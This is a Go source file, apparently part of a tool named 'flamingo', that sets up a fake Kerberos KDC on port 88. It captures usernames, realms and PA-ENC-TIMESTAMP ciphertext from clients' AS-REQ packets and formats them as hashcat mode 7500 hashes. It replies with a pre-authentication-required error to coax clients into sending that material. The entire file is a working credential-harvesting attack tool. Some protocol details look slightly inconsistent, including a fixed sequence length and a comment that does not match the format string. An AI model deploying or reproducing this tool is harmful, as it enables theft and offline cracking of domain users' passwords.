package flamingo

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"time"
)

type ConfKerberos struct {
	BindHost     string
	BindPort     uint16
	RecordWriter *RecordWriter
	tcpListener  net.Listener
	udpConn      *net.UDPConn
}

func NewConfKerberos() *ConfKerberos {
	return &ConfKerberos{
		BindHost: "0.0.0.0",
		BindPort: 88,
	}
}

func (c *ConfKerberos) Shutdown() {
	if c.tcpListener != nil {
		_ = c.tcpListener.Close()
	}
	if c.udpConn != nil {
		_ = c.udpConn.Close()
	}
}

func SpawnKerberos(conf *ConfKerberos) error {
	addr := fmt.Sprintf("%s:%d", conf.BindHost, conf.BindPort)

	// TCP listener
	tl, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}
	conf.tcpListener = tl

	// UDP listener
	udpAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		_ = tl.Close()
		return err
	}
	ul, err := net.ListenUDP("udp", udpAddr)
	if err != nil {
		_ = tl.Close()
		return err
	}
	conf.udpConn = ul

	// Handle TCP connections
	go func() {
		for {
			conn, err := tl.Accept()
			if err != nil {
				return
			}
			go handleKerberosTCPConn(conn, conf)
		}
	}()

	// Handle UDP packets
	go func() {
		buf := make([]byte, 8192)
		for {
			n, raddr, err := ul.ReadFrom(buf)
			if err != nil {
				return
			}
			packet := make([]byte, n)
			copy(packet, buf[:n])
			go handleKerberosUDPPacket(ul, raddr, packet, conf)
		}
	}()

	return nil
}

func handleKerberosTCPConn(conn net.Conn, conf *ConfKerberos) {
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))

	header := make([]byte, 4)
	if _, err := conn.Read(header); err != nil {
		return
	}
	length := binary.BigEndian.Uint32(header)
	if length > 65536 || length < 10 {
		return
	}

	payload := make([]byte, length)
	if _, err := conn.Read(payload); err != nil {
		return
	}

	resp := processKerberosPacket(payload, conn.RemoteAddr().String(), conf)
	if len(resp) > 0 {
		var out bytes.Buffer
		_ = binary.Write(&out, binary.BigEndian, uint32(len(resp)))
		out.Write(resp)
		_, _ = conn.Write(out.Bytes())
	}
}

func handleKerberosUDPPacket(conn *net.UDPConn, raddr net.Addr, packet []byte, conf *ConfKerberos) {
	resp := processKerberosPacket(packet, raddr.String(), conf)
	if len(resp) > 0 {
		_, _ = conn.WriteTo(resp, raddr)
	}
}

func processKerberosPacket(data []byte, remoteAddr string, conf *ConfKerberos) []byte {
	if len(data) < 10 {
		return nil
	}

	// AS-REQ tag is [APPLICATION 10] (0x6a)
	if data[0] != 0x6a {
		return nil
	}

	username, realm, etype, cipher := parseKerberosASREQ(data)

	if username != "" {
		rec := map[string]string{
			"username": username,
		}
		if realm != "" {
			rec["realm"] = realm
		}
		if etype != 0 {
			rec["etype"] = fmt.Sprintf("%d", etype)
		}
		if len(cipher) > 0 {
			// Hashcat format for Kerberos 5 AS-REQ pre-auth (mode 7500):
			// $krb5pa$etype$username$realm$salt$cipher
			rec["cipher"] = hex.EncodeToString(cipher)
			rec["hashcat"] = fmt.Sprintf("$krb5pa$%d$%s$%s$%s", etype, username, realm, hex.EncodeToString(cipher))
			rec["method"] = "PA-ENC-TIMESTAMP"
		} else {
			rec["method"] = "AS-REQ"
		}

		if conf.RecordWriter != nil {
			conf.RecordWriter.Record("credential", "kerberos", remoteAddr, rec)
		}
	}

	// Build KDC_ERR_PREAUTH_REQUIRED (error code 25 = 0x19) so clients send PA-ENC-TIMESTAMP if omitted
	return buildKerberosPreauthRequired(realm, username)
}

func parseKerberosASREQ(data []byte) (username string, realm string, etype int, cipher []byte) {
	// Simple, robust byte scanner for strings and PA-DATA in ASN.1 DER stream
	for i := 0; i < len(data)-4; i++ {
		tag := data[i]
		if tag == 0x1b || tag == 0x16 || tag == 0x13 { // GeneralString / IA5String / PrintableString
			sLen := int(data[i+1])
			if sLen > 0 && sLen < 128 && i+2+sLen <= len(data) {
				s := string(data[i+2 : i+2+sLen])
				if !strings.Contains(s, "krbtgt") && len(s) >= 2 {
					if strings.Contains(s, ".") && realm == "" {
						realm = s
					} else if username == "" && !strings.Contains(s, ".") {
						username = s
					}
				}
			}
		}

		// Look for padata-type 2 (0x02, 0x01, 0x02)
		if data[i] == 0x02 && data[i+1] == 0x01 && data[i+2] == 0x02 {
			// Scan ahead for etype and cipher
			for j := i + 3; j < len(data)-4 && j < i+128; j++ {
				if data[j] == 0x02 && data[j+1] == 0x01 && etype == 0 {
					etype = int(int8(data[j+2]))
				}
				if data[j] == 0x04 && len(cipher) == 0 { // OCTET STRING
					cLen := int(data[j+1])
					if j+2+cLen <= len(data) && cLen >= 16 {
						cipher = data[j+2 : j+2+cLen]
						break
					}
				}
			}
		}
	}
	return
}

func buildKerberosPreauthRequired(realm string, cname string) []byte {
	// Minimal KDC_ERR_PREAUTH_REQUIRED ([APPLICATION 30] = 0x7e)
	// pvno: 5, msg-type: 30, error-code: 25 (0x19)
	if realm == "" {
		realm = "DOMAIN.LOCAL"
	}
	var buf bytes.Buffer
	// Application 30 tag + sequence
	content := []byte{
		0x30, 0x2e,
		0xa0, 0x03, 0x02, 0x01, 0x05, // pvno 5
		0xa1, 0x03, 0x02, 0x01, 0x1e, // msg-type 30 (KRB-ERROR)
		0xa4, 0x03, 0x02, 0x01, 0x19, // error-code 25 (KDC_ERR_PREAUTH_REQUIRED)
		0xa9, byte(len(realm) + 2), 0x1b, byte(len(realm)), // realm
	}
	buf.Write(content)
	buf.WriteString(realm)

	res := buf.Bytes()
	var packet bytes.Buffer
	packet.WriteByte(0x7e) // [APPLICATION 30]
	packet.WriteByte(byte(len(res)))
	packet.Write(res)
	return packet.Bytes()
}
